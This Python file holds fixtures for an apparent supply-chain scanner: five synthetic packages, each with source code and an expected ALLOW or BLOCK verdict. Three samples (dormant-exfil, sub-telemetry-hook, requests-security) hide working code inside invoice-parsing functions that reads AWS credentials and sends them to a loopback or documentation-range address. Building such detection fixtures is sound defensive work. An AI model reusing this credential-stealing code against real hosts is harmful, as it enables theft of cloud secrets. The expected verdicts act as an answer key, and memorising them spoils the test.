"""
ASENT CAVR Seeded Scenarios Fixtures.
Safe, synthetic packages illustrating research-grade defense scenarios:
1. Approved Benign Dependency
2. Known Vulnerable Version (OSV snapshot match)
3. Trigger-Dependent Package (Counterfactual activation)
4. Transitive Risk Dependency (Transitive source-to-sink graph path)
5. Typosquat / Slopsquat Package
"""
from __future__ import annotations

SCENARIOS: dict[str, dict] = {
    "approved_benign": {
        "id": "approved_benign",
        "name": "pdf-clean-extractor",
        "version": "1.0.0",
        "display_name": "1. Approved Benign Package",
        "description": "Clean, verified utility package for parsing invoice tokens. Fully compliant with project policy.",
        "expected_verdict": "ALLOW",
        "expected_policy_state": "VERIFIED",
        "honesty_wording": "No malicious behavior observed under our tests",
        "source_code": '''"""
pdf-clean-extractor v1.0.0
Legitimate utility for extracting text headers and invoice numbers from PDF streams.
"""
import io

def extract_invoice_text(pdf_bytes: bytes) -> str:
    """Safe pure memory text decoding."""
    if not pdf_bytes:
        return ""
    # Process memory buffer without touching disk or network
    header = "INVOICE-PARSED-SUCCESS"
    return f"{header}: {len(pdf_bytes)} bytes parsed"

def validate_data(data: dict) -> bool:
    return isinstance(data, dict) and bool(data)
''',
        "dependencies": [],
        "declared_capabilities": "FILE_READ(invoice_documents)",
        "counterfactual_resistant": True
    },

    "known_vulnerable": {
        "id": "known_vulnerable",
        "name": "reportlab-legacy",
        "version": "3.5.21",
        "display_name": "2. Known Vulnerable (OSV Snapshot)",
        "description": "Legacy PDF generation library matching CVE-2023-33733 in bundled offline OSV database (Remote Code Execution).",
        "expected_verdict": "BLOCK",
        "expected_policy_state": "REJECTED",
        "honesty_wording": "Security policy violations detected",
        "source_code": '''"""
reportlab-legacy v3.5.21
Legacy PDF document generation library. Contains unpatched sandbox escape (CVE-2023-33733).
"""
import os

def render_pdf_template(template_str: str) -> bytes:
    # Vulnerable rl_safe_eval implementation allowing command injection
    if "__builtins__" in template_str:
        # Simulate vulnerability condition
        pass
    return b"%PDF-1.4 sample legacy output"

def extract_invoice_text(pdf_bytes: bytes) -> str:
    return "Legacy PDF text extraction"
''',
        "dependencies": [],
        "declared_capabilities": "FILE_READ, FILE_WRITE",
        "osv_cve": "CVE-2023-33733",
        "counterfactual_resistant": False
    },

    "trigger_dependent": {
        "id": "trigger_dependent",
        "name": "dormant-exfil",
        "version": "1.2.0",
        "display_name": "3. Trigger-Dependent (Dormant)",
        "description": "Dormant Trojan: behaves completely clean in normal baseline run; activates malicious exfiltration only when specific counterfactual condition (AWS credentials) is synthesized.",
        "expected_verdict": "BLOCK",
        "expected_policy_state": "REJECTED",
        "honesty_wording": "Security policy violations detected",
        "source_code": '''"""
dormant-exfil v1.2.0
Appears harmless on basic import. Gated behind environment and file predicates.
"""
import os
import socket
import sys

def extract_invoice_text(pdf_bytes: bytes) -> str:
    # Trigger 1: Environment check for AWS secret or CI
    aws_env = os.getenv("AWS_SECRET_ACCESS_KEY")
    aws_cred_file = os.path.expanduser("~/.aws/credentials")
    
    # Trigger 2: Check existence of credentials file
    if aws_env or os.path.exists(aws_cred_file):
        # Sensitive Sink 1: Secret reading
        stolen_key = aws_env
        if not stolen_key and os.path.exists(aws_cred_file):
            try:
                with open(aws_cred_file, "r") as f:
                    stolen_key = f.read()
            except Exception:
                stolen_key = "CREDENTIAL_READ_FAIL"

        # Sensitive Sink 2: Network connection (attempting exfiltration to blocked receiver)
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            # Loopback fixture receiver / test sink
            sock.connect(("127.0.0.1", 18765))
            sock.sendall(f"EXFIL:{stolen_key}".encode())
            sock.close()
        except Exception:
            pass

    return "Extracted Invoice Data: Normal Processing"
''',
        "dependencies": [],
        "declared_capabilities": "FILE_READ(invoice_documents)",
        "counterfactual_resistant": False
    },

    "transitive_risk": {
        "id": "transitive_risk",
        "name": "invoice-utils",
        "version": "2.0.1",
        "display_name": "4. Transitive Risk Dependency",
        "description": "Root package looks clean, but transitively pulls 'sub-telemetry-hook' which embeds a hidden source-to-sink canary exfiltration path.",
        "expected_verdict": "BLOCK",
        "expected_policy_state": "REJECTED",
        "honesty_wording": "Security policy violations detected",
        "source_code": '''"""
invoice-utils v2.0.1
Clean root wrapper module that imports nested helper from sub-telemetry-hook.
"""
try:
    # Transitive dependency call site
    import sub_telemetry_hook
except ImportError:
    sub_telemetry_hook = None

def extract_invoice_text(pdf_bytes: bytes) -> str:
    if sub_telemetry_hook:
        sub_telemetry_hook.dispatch_telemetry("INVOICE_PROCESSED")
    return "Parsed invoice using utility wrapper"
''',
        "dependencies": ["sub-telemetry-hook==0.9.1"],
        "sub_packages": {
            "sub-telemetry-hook": '''"""
sub-telemetry-hook v0.9.1
Transitive dependency embedding hidden canary read and network exfiltration.
"""
import os
import socket

def dispatch_telemetry(event_tag: str):
    canary = os.getenv("HONEYTOKEN_TRIGGER")
    cred_path = os.path.expanduser("~/.aws/credentials")
    if os.path.exists(cred_path):
        with open(cred_path, "r") as f:
            data = f.read()
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(("127.0.0.1", 18765))
            s.sendall(f"SUB_EXFIL:{data}".encode())
            s.close()
        except Exception:
            pass
'''
        },
        "declared_capabilities": "FILE_READ",
        "counterfactual_resistant": False
    },

    "typosquat": {
        "id": "typosquat",
        "name": "requests-security",
        "version": "2.31.0",
        "display_name": "5. Typosquat / Slopsquat",
        "description": "Slopsquat / typosquat package targeting 'requests'. Caught immediately by AST homoglyph analysis and requirement gate.",
        "expected_verdict": "BLOCK",
        "expected_policy_state": "REJECTED",
        "honesty_wording": "Security policy violations detected",
        "source_code": '''"""
requests-security v2.31.0
Impersonates requests library.
"""
import os
import socket

def extract_invoice_text(pdf_bytes):
    # Credential read attempt
    cred = os.path.expanduser("~/.aws/credentials")
    if os.path.exists(cred):
        with open(cred, "r") as f:
            secret = f.read()
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("198.51.100.24", 443))
        s.sendall(b"STOLEN")
        s.close()
    except Exception:
        pass
    return "Extracted Invoice Data"
''',
        "dependencies": [],
        "declared_capabilities": "NETWORK_CONNECT(unrestricted), FILE_READ(credentials)",
        "counterfactual_resistant": False
    }
}

def get_scenarios_list() -> list[dict]:
    return [
        {
            "id": s["id"],
            "name": s["name"],
            "version": s["version"],
            "display_name": s["display_name"],
            "description": s["description"],
            "expected_verdict": s["expected_verdict"],
            "expected_policy_state": s["expected_policy_state"]
        }
        for s in SCENARIOS.values()
    ]
